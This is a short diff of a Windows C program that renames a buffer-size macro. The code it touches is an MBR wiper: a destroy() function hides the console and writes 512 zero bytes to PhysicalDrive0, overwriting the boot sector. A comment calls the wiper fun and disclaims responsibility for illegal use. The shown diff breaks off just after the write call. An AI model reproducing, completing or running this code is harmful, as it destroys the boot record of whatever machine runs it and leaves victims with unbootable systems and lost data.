@@ -1,6 +1,6 @@
 #include <windows.h>
 #define WIN32_LEAN_AND_MEAN
-#define MBR 512
+#define BUFFER 512
 
 /*
 This was my original intention on using this, its pretty fun but ineffective nowadays.
@@ -12,7 +12,7 @@ I DO NOT CONDONE ANY ILLEGAL ACTIONS AND I WILL NOT BE RESPONSIBLE FOR WHATEVER 
 void destroy(){
 	FreeConsole();
 	DWORD write;
-	char mbrData[MBR];
+	char mbrData[BUFFER];
 	ZeroMemory(&mbrData, sizeof(mbrData));
 	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 	if(WriteFile(MBR, mbrData, 512, &write, NULL)==true) {
